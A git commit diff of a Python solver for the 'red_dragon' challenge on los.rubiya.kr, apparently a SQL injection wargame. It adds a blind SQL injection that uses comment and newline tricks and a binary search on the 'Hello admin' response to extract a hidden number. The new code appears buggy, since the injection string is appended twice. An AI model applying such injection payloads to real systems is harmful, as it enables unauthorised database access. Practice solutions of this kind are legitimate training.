ef97ae0f6f01a79d12a5893ee794198b67f68fe3
winters0x64 <arun0x168codes@gmail.com>
2023-06-28 18:50:45 +0530

    red dragon

--- Scripts/los/los_reddragon.py
+++ Scripts/los/los_reddragon.py
@@ -1,37 +1,3 @@
-""" import requests
-
-MIN = 100000000
-MAX = 1000000000
-
-URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
-COOKIE = "mcmgkg6nanrgce9bn43o2nhds3"
-
-def binary_search(start, end):
-    if start == end:
-        print("==> " + str(start + 1))
-        exit()
-
-    mid = (start + end) // 2
-    data = make_request(mid)
-
-    if "Hello admin" in data:
-        start = mid + 1
-    else:
-        end = mid - 1
-
-    binary_search(start, end)
-
-def make_request(no):
-    payload = "?id='||no>%23&no=%0A{}".format(no)
-
-    print("Trying {}...".format(no))
-    response = requests.get(URL + payload, headers={"Cookie": COOKIE})
-
-    return response.text
-
-binary_search(MIN, MAX) """
-
-
 import requests
 
 URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php/?id='||no>%23&no=%0a";
@@ -40,22 +6,28 @@ auth = {"PHPSESSID":"mcmgkg6nanrgce9bn43o2nhds3"};
 MAX = 1000000000
 MIN = 100000000
 
+def binary_search(start, end):
+    if start == end:
+        print("==> " + str(start + 1))
+        exit()
+
+    mid = (start + end) // 2
+    payload = f"?id='||no>%23&no=%0A{mid}"
+    print(f"Trying {mid}...")
+    response = requests.get(URL + payload,cookies=auth)
+    data = response.text
+
+    if "Hello admin" in data:
+        start = mid + 1
+    else:
+        end = mid - 1
+
+    binary_search(start, end)
+
 #Find the number: Implementing linear search would take a long time hence we're using binary search here.
 def main():
-    print("Brute Forcing the Number");
-    left = MIN;
-    right = MAX;
-    while(left<right):
-        center = (left+right)//2;
-    r = requests.get(URL+str(center),cookies=auth);
-    if "Hello admin" in r.text:
-        print("Found it n: "+str(center));
-    requests.get(URL+str(center-1),cookies=auth);
-    if "Hello admin" in r.text:
-        print("Found it n: "+str(center));
-    #r = requests.get(URL+str(center),cookies=auth);
+    print("Brute Forcing the Number: ");
+    binary_search(MIN,MAX)
     
-
-
 if __name__ == "__main__":
     main();
